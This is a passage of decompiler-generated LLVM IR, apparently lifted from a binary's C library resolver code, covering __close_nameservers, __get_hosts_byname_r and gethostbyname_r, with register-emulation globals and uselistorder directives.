  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 17, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 51, 50, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 54, 52, 53, 56, 55 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 0, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 25, 27, 28, 3, 34, 24, 4, 5, 23, 29, 15, 21, 22, 38, 37, 26, 0, 16, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 17, 18, 19, 20, 30, 31, 32, 33, 35, 36 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -35076, { 1, 0 }
  uselistorder i32 1123, { 0, 3, 4, 2, 1 }
  uselistorder i32 -34120, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34120), { 1, 0 }
  uselistorder i32 27348, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_19598, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_19508, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_194bc, { 1, 0 }
  uselistorder label %dec_label_pc_194b4, { 1, 0 }
  uselistorder label %dec_label_pc_19378, { 1, 0 }
  uselistorder label %dec_label_pc_19498.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_191f4, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_19600 = load i32, i32* @r4, align 4
  store i32 %v3_19600, i32* %stack_var_-20, align 4
  store i32 27356, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  store i32 -34044, i32* %r3.global-to-local, align 4
  %v4_19614 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 27356) to i32*), align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34044), i32* %r3.global-to-local, align 4
  store i32 103976, i32* @lr, align 4
  %v1_19624 = icmp ne i32 %v4_19614, add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34044)
  call void @__pseudo_cond_branch(i1 %v1_19624, i32 ptrtoint (i32* @global_var_1363c.312 to i32))
  store i32 27360, i32* %r3.global-to-local, align 4
  store i32 27364, i32* @r7, align 4
  store i32 27352, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_19638 = load i32, i32* @r5, align 4
  %v3_19638 = add i32 %v1_19638, 27360
  %v4_19638 = inttoptr i32 %v3_19638 to i32*
  store i32 0, i32* %v4_19638, align 4
  %v0_1963c = load i32, i32* %r2.global-to-local, align 4
  %v1_1963c = load i32, i32* @r5, align 4
  %v2_1963c = load i32, i32* %r4.global-to-local, align 4
  %v3_1963c = add i32 %v2_1963c, %v1_1963c
  %v4_1963c = inttoptr i32 %v3_1963c to i32*
  store i32 %v0_1963c, i32* %v4_1963c, align 4
  br label %dec_label_pc_19654

dec_label_pc_19644:                               ; preds = %dec_label_pc_19654
  store i32 %v4_19668, i32* %r3.global-to-local, align 4
  store i32 %v1_1965c, i32* %v3_19654, align 4
  %v0_1964c = load i32, i32* %r3.global-to-local, align 4
  %v1_1964c = load i32, i32* %r2.global-to-local, align 4
  %v4_1964c = mul i32 %v1_1964c, 4
  %v5_1964c = add i32 %v4_1964c, %v0_1964c
  %v6_1964c = inttoptr i32 %v5_1964c to i32*
  %v7_1964c = load i32, i32* %v6_1964c, align 4
  store i32 %v7_1964c, i32* @r0, align 4
  %v0_19650 = call i32 @free()
  br label %dec_label_pc_19654

dec_label_pc_19654:                               ; preds = %entry, %dec_label_pc_19644
  %v0_19654 = load i32, i32* @r5, align 4
  %v1_19654 = load i32, i32* @r7, align 4
  %v2_19654 = add i32 %v1_19654, %v0_19654
  %v3_19654 = inttoptr i32 %v2_19654 to i32*
  %v4_19654 = load i32, i32* %v3_19654, align 4
  store i32 %v4_19654, i32* @r4, align 4
  %v2_19658 = icmp eq i32 %v4_19654, 0
  %v1_1965c = add i32 %v4_19654, -1
  store i32 %v1_1965c, i32* %r2.global-to-local, align 4
  %v0_19660 = load i32, i32* @r6, align 4
  store i32 %v0_19660, i32* %r3.global-to-local, align 4
  %v2_19668 = add i32 %v0_19660, %v0_19654
  %v3_19668 = inttoptr i32 %v2_19668 to i32*
  %v4_19668 = load i32, i32* %v3_19668, align 4
  br i1 %v2_19658, label %dec_label_pc_19668, label %dec_label_pc_19644

dec_label_pc_19668:                               ; preds = %dec_label_pc_19654
  store i32 %v4_19668, i32* @r0, align 4
  %v0_1966c = call i32 @free()
  %v0_19670 = load i32, i32* @r4, align 4
  %v1_19670 = load i32, i32* @r5, align 4
  %v2_19670 = load i32, i32* @r6, align 4
  %v3_19670 = add i32 %v2_19670, %v1_19670
  %v4_19670 = inttoptr i32 %v3_19670 to i32*
  store i32 %v0_19670, i32* %v4_19670, align 4
  %v2_19678 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19678, i32* %r4.global-to-local, align 4
  ret i32 %v0_1966c

; uselistorder directives
  uselistorder i32 %v4_19668, { 1, 0 }
  uselistorder i32 %v1_1965c, { 1, 0 }
  uselistorder i32* %v3_19654, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 27352, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 27364, { 1, 2, 4, 3, 0 }
  uselistorder i32 27360, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -34044, { 1, 2, 0, 3 }
  uselistorder i32 27356, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_19654, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_19698 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_196d4 = call i32 @__read_etc_hosts_r()
  store i32 %v0_19698, i32* @lr, align 4
  ret i32 %v0_196d4
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_196ec = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_196f8 = load i32, i32* @r0, align 4
  store i32 %v0_196f8, i32* @sl, align 4
  %v2_196f8 = icmp eq i32 %v0_196f8, 0
  %v2_196fc = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_196fc, align 4
  %v0_19700 = load i32, i32* @r1, align 4
  store i32 %v0_19700, i32* @r7, align 4
  %v0_19704 = load i32, i32* @r3, align 4
  store i32 %v0_19704, i32* @r6, align 4
  br i1 %v2_196f8, label %bb, label %dec_label_pc_19710

bb:                                               ; preds = %entry
  %v1_19708 = load i32, i32* @r5, align 4
  %v2_19708 = add i32 %v1_19708, 22
  store i32 %v2_19708, i32* @r5, align 4
  br label %dec_label_pc_199cc

dec_label_pc_19710:                               ; preds = %entry
  %v0_19710 = call i32 @__GI___errno_location()
  store i32 %v0_19710, i32* %r0.global-to-local, align 4
  %v3_19714 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19714, i32* %ip.global-to-local, align 4
  %v1_19718 = inttoptr i32 %v0_19710 to i32*
  %v2_19718 = load i32, i32* %v1_19718, align 4
  store i32 %v2_19718, i32* @r8, align 4
  %v0_1971c = load i32, i32* @r5, align 4
  store i32 %v0_1971c, i32* %v1_19718, align 4
  %v0_19720 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_19710, i32* @r4, align 4
  %v0_19730 = load i32, i32* @sl, align 4
  store i32 %v0_19730, i32* %r0.global-to-local, align 4
  %v0_19734 = load i32, i32* @r7, align 4
  store i32 %v0_19734, i32* %r2.global-to-local, align 4
  store i32 %v0_196ec, i32* %r3.global-to-local, align 4
  %v0_1973c = load i32, i32* @r6, align 4
  %v7_19744 = call i32 @__get_hosts_byname_r(i32 %v0_19730, i32 2, i32 %v0_19734, i32 %v0_196ec, i32 %v0_1973c, i32 %v0_19720, i32 %tmp18)
  store i32 %v7_19744, i32* %r0.global-to-local, align 4
  store i32 %v7_19744, i32* @r5, align 4
  %v2_19748 = icmp eq i32 %v7_19744, 0
  br i1 %v2_19748, label %bb34, label %dec_label_pc_19754

bb34:                                             ; preds = %dec_label_pc_19710
  %v1_1974c = load i32, i32* @r8, align 4
  %v2_1974c = load i32, i32* @r4, align 4
  %v3_1974c = inttoptr i32 %v2_1974c to i32*
  store i32 %v1_1974c, i32* %v3_1974c, align 4
  br label %dec_label_pc_199cc

dec_label_pc_19754:                               ; preds = %dec_label_pc_19710
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_19758 = inttoptr i32 %tmp18 to i32*
  %v2_19758 = load i32, i32* %v1_19758, align 4
  store i32 %v2_19758, i32* %r3.global-to-local, align 4
  %v7_1975c = icmp eq i32 %v2_19758, 1
  br i1 %v7_1975c, label %dec_label_pc_19778, label %dec_label_pc_19764

dec_label_pc_19764:                               ; preds = %dec_label_pc_19754
  %v7_19764 = icmp eq i32 %v2_19758, 4
  br i1 %v7_19764, label %dec_label_pc_19798, label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %dec_label_pc_19764
  %v3_1976c = icmp eq i32 %v2_19758, -1
  br i1 %v3_1976c, label %dec_label_pc_1978c, label %dec_label_pc_199cc

dec_label_pc_19778:                               ; preds = %dec_label_pc_19754
  %v7_19778 = icmp eq i32 %v7_19744, 2
  br i1 %v7_19778, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_19778
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_197a0

.thread4:                                         ; preds = %dec_label_pc_19778
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_197a0

dec_label_pc_1978c:                               ; preds = %dec_label_pc_1976c
  %v0_1978c = load i32, i32* @r4, align 4
  %v1_1978c = inttoptr i32 %v0_1978c to i32*
  %v2_1978c = load i32, i32* %v1_1978c, align 4
  store i32 %v2_1978c, i32* %r3.global-to-local, align 4
  %v7_19790 = icmp eq i32 %v2_1978c, 2
  br i1 %v7_19790, label %dec_label_pc_19798, label %dec_label_pc_199cc

dec_label_pc_19798:                               ; preds = %dec_label_pc_1978c, %dec_label_pc_19764
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_197a0

dec_label_pc_197a0:                               ; preds = %.thread4, %bb35, %dec_label_pc_19798
  %storemerge2 = phi i32 [ 0, %dec_label_pc_19798 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_197a8 = load i32, i32* @r8, align 4
  %v1_197a8 = load i32, i32* @r4, align 4
  %v2_197a8 = inttoptr i32 %v1_197a8 to i32*
  store i32 %v0_197a8, i32* %v2_197a8, align 4
  %v0_197ac = load i32, i32* @sl, align 4
  %v1_197ac = inttoptr i32 %v0_197ac to i8*
  store i32 %v0_197ac, i32* %r0.global-to-local, align 4
  %v0_197b0 = load i32, i32* @r3, align 4
  %v1_197b0 = load i32, i32* @ip, align 4
  %v2_197b0 = inttoptr i32 %v1_197b0 to i32*
  store i32 %v0_197b0, i32* %v2_197b0, align 4
  %v3_197b4 = call i32 @strlen(i8* %v1_197ac)
  store i32 %v3_197b4, i32* %r0.global-to-local, align 4
  %v1_197b8 = add i32 %v3_197b4, 1
  store i32 %v1_197b8, i32* @r4, align 4
  %v0_197bc = load i32, i32* @r6, align 4
  %v7_197c0 = icmp sgt i32 %v0_197bc, %v1_197b8
  br i1 %v7_197c0, label %dec_label_pc_197c4, label %dec_label_pc_199c8

dec_label_pc_197c4:                               ; preds = %dec_label_pc_197a0
  %v0_197c4 = load i32, i32* @sl, align 4
  store i32 %v0_197c4, i32* @r1, align 4
  store i32 %v1_197b8, i32* @r2, align 4
  store i32 %v0_196ec, i32* @r0, align 4
  %v0_197d0 = call i32 @memcpy()
  store i32 %v0_197d0, i32* %r0.global-to-local, align 4
  %v1_197d8 = load i32, i32* @r4, align 4
  %v2_197d8 = add i32 %v1_197d8, %v0_196ec
  %v1_197dc = sub i32 0, %v2_197d8
  %v1_197e0 = load i32, i32* @r6, align 4
  %v2_197e0 = sub i32 %v1_197e0, %v1_197d8
  store i32 %v2_197e0, i32* %r2.global-to-local, align 4
  %v1_197e4 = urem i32 %v1_197dc, 4
  store i32 %v1_197e4, i32* %r3.global-to-local, align 4
  %v2_197e8 = sub i32 %v2_197e0, %v1_197e4
  store i32 %v2_197e8, i32* @sb, align 4
  %v1_197ec = add i32 %v2_197e8, -8
  store i32 %v1_197ec, i32* @r5, align 4
  %v7_197f4 = icmp slt i32 %v1_197ec, 256
  br i1 %v7_197f4, label %dec_label_pc_199c8, label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197c4
  %v2_197f8 = add i32 %v1_197e4, %v2_197d8
  store i32 %v2_197f8, i32* @fp, align 4
  store i32 %v0_196ec, i32* %ip.global-to-local, align 4
  %v1_19800 = add i32 %v2_197f8, 8
  store i32 %v1_19800, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_19808 = add i32 %v2_197f8, 16
  store i32 %v1_19808, i32* @r8, align 4
  %v4_1980c = inttoptr i32 %v2_197f8 to i32*
  store i32 %v0_196ec, i32* %v4_1980c, align 4
  %v0_19810 = load i32, i32* @sl, align 4
  store i32 %v0_19810, i32* %r0.global-to-local, align 4
  %v0_19814 = load i32, i32* @r4, align 4
  %v1_19814 = load i32, i32* @fp, align 4
  %v2_19814 = add i32 %v1_19814, 4
  %v3_19814 = inttoptr i32 %v2_19814 to i32*
  store i32 %v0_19814, i32* %v3_19814, align 4
  %v0_19818 = load i32, i32* @r8, align 4
  %v2_1981c = inttoptr i32 %v0_19810 to i8*
  %v3_1981c = call i32 @inet_aton(i8* %v2_1981c, i32 %v0_19818)
  store i32 %v3_1981c, i32* %r0.global-to-local, align 4
  %v1_19820 = load i32, i32* @r4, align 4
  %v9_19820 = icmp eq i32 %v3_1981c, %v1_19820
  br i1 %v9_19820, label %dec_label_pc_19864, label %dec_label_pc_19828

dec_label_pc_19828:                               ; preds = %dec_label_pc_197f8
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1982c = load i32, i32* @r7, align 4
  %v2_1982c = add i32 %v1_1982c, 8
  %v3_1982c = inttoptr i32 %v2_1982c to i32*
  store i32 2, i32* %v3_1982c, align 4
  %v0_19830 = load i32, i32* %r3.global-to-local, align 4
  %v2_19830 = mul i32 %v0_19830, 2
  %v1_19834 = load i32, i32* @r7, align 4
  %v2_19834 = add i32 %v1_19834, 12
  %v3_19834 = inttoptr i32 %v2_19834 to i32*
  store i32 %v2_19830, i32* %v3_19834, align 4
  %v3_19838 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19838, i32* %r2.global-to-local, align 4
  store i32 %v0_196ec, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_19844 = load i32, i32* @r4, align 4
  store i32 %v0_19844, i32* @r5, align 4
  %v0_19848 = load i32, i32* @r8, align 4
  %v1_19848 = load i32, i32* @fp, align 4
  %v2_19848 = add i32 %v1_19848, 8
  %v3_19848 = inttoptr i32 %v2_19848 to i32*
  store i32 %v0_19848, i32* %v3_19848, align 4
  %v0_1984c = load i32, i32* @r7, align 4
  %v1_1984c = load i32, i32* %r2.global-to-local, align 4
  %v2_1984c = inttoptr i32 %v1_1984c to i32*
  store i32 %v0_1984c, i32* %v2_1984c, align 4
  %v0_19850 = load i32, i32* @r7, align 4
  %v1_19850 = inttoptr i32 %v0_19850 to i32*
  %v2_19850 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_19850, i32* %v1_19850, align 4
  %v3_19850 = add i32 %v0_19850, 4
  %v4_19850 = inttoptr i32 %v3_19850 to i32*
  %v5_19850 = load i32, i32* @fp, align 4
  store i32 %v5_19850, i32* %v4_19850, align 4
  %v0_19854 = load i32, i32* @r6, align 4
  %v1_19854 = load i32, i32* @r7, align 4
  %v2_19854 = add i32 %v1_19854, 16
  %v3_19854 = inttoptr i32 %v2_19854 to i32*
  store i32 %v0_19854, i32* %v3_19854, align 4
  %v0_19858 = load i32, i32* @r4, align 4
  %v1_19858 = load i32, i32* @ip, align 4
  %v2_19858 = inttoptr i32 %v1_19858 to i32*
  store i32 %v0_19858, i32* %v2_19858, align 4
  %v0_1985c = load i32, i32* @r4, align 4
  %v1_1985c = load i32, i32* @r6, align 4
  %v2_1985c = add i32 %v1_1985c, 4
  %v3_1985c = inttoptr i32 %v2_1985c to i32*
  store i32 %v0_1985c, i32* %v3_1985c, align 4
  br label %dec_label_pc_199cc

dec_label_pc_19864:                               ; preds = %dec_label_pc_197f8
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_19868 = icmp eq i32 %storemerge2, 0
  br i1 %v2_19868, label %dec_label_pc_19880, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19864
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19758, align 4
  br label %dec_label_pc_199cc

dec_label_pc_19880:                               ; preds = %dec_label_pc_19864
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1988c = load i32, i32* @sl, align 4
  store i32 %v0_1988c, i32* %r0.global-to-local, align 4
  %v2_19894 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19894, i32* %r2.global-to-local, align 4
  %v2_19898 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_19898, i32* %r3.global-to-local, align 4
  %v7_198a4 = inttoptr i32 %v0_1988c to i8*
  %v8_198a4 = call i32 @__dns_lookup(i8* %v7_198a4, i32 1, i32 %v2_19894, i32 %v2_19898)
  store i32 %v8_198a4, i32* %r0.global-to-local, align 4
  %v1_198a8 = icmp slt i32 %v8_198a4, 0
  br i1 %v1_198a8, label %.thread, label %dec_label_pc_198c0

.thread:                                          ; preds = %dec_label_pc_19880
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19758, align 4
  br label %dec_label_pc_199cc

dec_label_pc_198c0:                               ; preds = %dec_label_pc_19880
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_198c4 = icmp eq i32 %tmp12, 1
  br i1 %v7_198c4, label %dec_label_pc_198cc, label %dec_label_pc_199a4

dec_label_pc_198cc:                               ; preds = %dec_label_pc_198c0
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_198e4 = load i32, i32* @r5, align 4
  %v2_198e4 = add i32 %v0_198e4, -12
  store i32 %v2_198e4, i32* @r8, align 4
  %v8_198e4 = icmp slt i32 %v2_198e4, 0
  br i1 %v8_198e4, label %bb37, label %dec_label_pc_198f0

bb37:                                             ; preds = %dec_label_pc_198cc
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_199b4

dec_label_pc_198f0:                               ; preds = %dec_label_pc_198cc
  %v0_198f0 = load i32, i32* @r6, align 4
  store i32 %v0_198f0, i32* @r1, align 4
  %v2_198f4 = add i32 %v0_198f0, 12
  store i32 %v2_198f4, i32* @r0, align 4
  %v2_198f8 = call i32 @memmove(i32 %v2_198f4, i32 %v0_198f0)
  %v0_198fc = load i32, i32* @fp, align 4
  %v1_198fc = add i32 %v0_198fc, 4
  store i32 %v1_198fc, i32* @r3, align 4
  %v1_19900 = load i32, i32* @r4, align 4
  %v2_19900 = add i32 %v1_19900, %v1_198fc
  store i32 %v2_19900, i32* @r5, align 4
  store i32 %v2_19900, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_19910 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1991c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1991c

dec_label_pc_1991c:                               ; preds = %dec_label_pc_1991c, %dec_label_pc_198f0
  %v0_1991c = phi i32 [ %v0_1991c.pre, %dec_label_pc_198f0 ], [ %v1_19920, %dec_label_pc_1991c ]
  %v1_1991c = load i32, i32* @r6, align 4
  %v7_1991c = inttoptr i32 %v1_1991c to i32*
  store i32 %v0_1991c, i32* %v7_1991c, align 4
  %v0_19920 = load i32, i32* @r5, align 4
  %v1_19920 = add i32 %v0_19920, 4
  store i32 %v1_19920, i32* @r5, align 4
  %v0_19924 = load i32, i32* %r0.global-to-local, align 4
  %v1_19924 = add i32 %v0_19924, 1
  store i32 %v1_19924, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_19924, 0
  br i1 %tmp38, label %dec_label_pc_1991c, label %dec_label_pc_19934

dec_label_pc_19934:                               ; preds = %dec_label_pc_1991c
  %v3_19934 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_19934, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1993c = icmp eq i32 %v3_19934, 0
  %v1_19940 = load i32, i32* @r6, align 4
  %v5_19940 = mul i32 %v1_19924, 4
  %v6_19940 = add i32 %v1_19940, %v5_19940
  %v7_19940 = inttoptr i32 %v6_19940 to i32*
  store i32 0, i32* %v7_19940, align 4
  br i1 %v2_1993c, label %dec_label_pc_19970, label %dec_label_pc_19948

dec_label_pc_19948:                               ; preds = %dec_label_pc_19934
  %v0_19948 = load i32, i32* @r4, align 4
  %v1_19948 = inttoptr i32 %v0_19948 to i8*
  store i32 %v0_19948, i32* %r0.global-to-local, align 4
  %v3_1994c = call i32 @strlen(i8* %v1_19948)
  store i32 %v3_1994c, i32* %r0.global-to-local, align 4
  %v0_19950 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_19950, %v3_1994c
  br i1 %tmp, label %dec_label_pc_19958, label %dec_label_pc_19970

dec_label_pc_19958:                               ; preds = %dec_label_pc_19948
  %v0_19958 = load i32, i32* @r4, align 4
  store i32 %v0_19958, i32* @r1, align 4
  %v0_1995c = load i32, i32* @r5, align 4
  store i32 %v0_1995c, i32* %r0.global-to-local, align 4
  %v2_19960 = inttoptr i32 %v0_1995c to i8*
  %v3_19960 = call i32 @strcpy(i8* %v2_19960, i32 %v0_19958)
  store i32 %v3_19960, i32* %r0.global-to-local, align 4
  %v0_19964 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19970

dec_label_pc_19970:                               ; preds = %dec_label_pc_19948, %dec_label_pc_19934, %dec_label_pc_19958
  %storemerge1 = phi i32 [ %v0_19964, %dec_label_pc_19958 ], [ %v0_196ec, %dec_label_pc_19948 ], [ %v0_196ec, %dec_label_pc_19934 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_19974 = load i32, i32* @r7, align 4
  %v2_19974 = add i32 %v1_19974, 8
  %v3_19974 = inttoptr i32 %v2_19974 to i32*
  store i32 2, i32* %v3_19974, align 4
  %v0_19978 = load i32, i32* %r2.global-to-local, align 4
  %v2_19978 = mul i32 %v0_19978, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19980 = load i32, i32* @r7, align 4
  %v2_19980 = add i32 %v1_19980, 12
  %v3_19980 = inttoptr i32 %v2_19980 to i32*
  store i32 %v2_19978, i32* %v3_19980, align 4
  %v3_19984 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19984, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1998c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1998c, i32* @r5, align 4
  %v0_19990 = load i32, i32* @r7, align 4
  %v2_19990 = inttoptr i32 %v3_19984 to i32*
  store i32 %v0_19990, i32* %v2_19990, align 4
  %v0_19994 = load i32, i32* @r7, align 4
  %v1_19994 = inttoptr i32 %v0_19994 to i32*
  %v2_19994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19994, i32* %v1_19994, align 4
  %v3_19994 = add i32 %v0_19994, 4
  %v4_19994 = inttoptr i32 %v3_19994 to i32*
  %v5_19994 = load i32, i32* @fp, align 4
  store i32 %v5_19994, i32* %v4_19994, align 4
  %v0_19998 = load i32, i32* @r6, align 4
  %v1_19998 = load i32, i32* @r7, align 4
  %v2_19998 = add i32 %v1_19998, 16
  %v3_19998 = inttoptr i32 %v2_19998 to i32*
  store i32 %v0_19998, i32* %v3_19998, align 4
  %v0_1999c = load i32, i32* %r3.global-to-local, align 4
  %v1_1999c = load i32, i32* %r2.global-to-local, align 4
  %v2_1999c = inttoptr i32 %v1_1999c to i32*
  store i32 %v0_1999c, i32* %v2_1999c, align 4
  br label %dec_label_pc_199b4

dec_label_pc_199a4:                               ; preds = %dec_label_pc_198c0
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_19758, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_199b4

dec_label_pc_199b4:                               ; preds = %bb37, %dec_label_pc_19970, %dec_label_pc_199a4
  %v3_199b4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_199b4, i32* @r0, align 4
  %v0_199b8 = call i32 @free()
  %v3_199bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_199bc, i32* @r0, align 4
  %v0_199c0 = call i32 @free()
  store i32 %v0_199c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_199cc

dec_label_pc_199c8:                               ; preds = %dec_label_pc_197a0, %dec_label_pc_197c4
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_199cc

dec_label_pc_199cc:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1978c, %dec_label_pc_1976c, %dec_label_pc_199b4, %dec_label_pc_19828, %dec_label_pc_199c8
  %v0_199cc = load i32, i32* @r5, align 4
  store i32 %v0_199cc, i32* %r0.global-to-local, align 4
  ret i32 %v0_199cc

; uselistorder directives
  uselistorder i32 %v0_19948, { 1, 0 }
  uselistorder i32 %v1_19924, { 1, 0, 2 }
  uselistorder i32 %v1_19920, { 1, 0 }
  uselistorder i32 %v0_198f0, { 1, 0, 2 }
  uselistorder i32 %v2_198e4, { 1, 0 }
  uselistorder i32 %v1_197e4, { 2, 1, 0 }
  uselistorder i32 %v1_197d8, { 1, 0 }
  uselistorder i32 %v0_197ac, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_19758, { 2, 0, 1, 3 }
  uselistorder i32 %v0_196f8, { 1, 0 }
  uselistorder i32 %v0_196ec, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 19, 20, 3, 2, 5, 4, 6, 17, 18, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
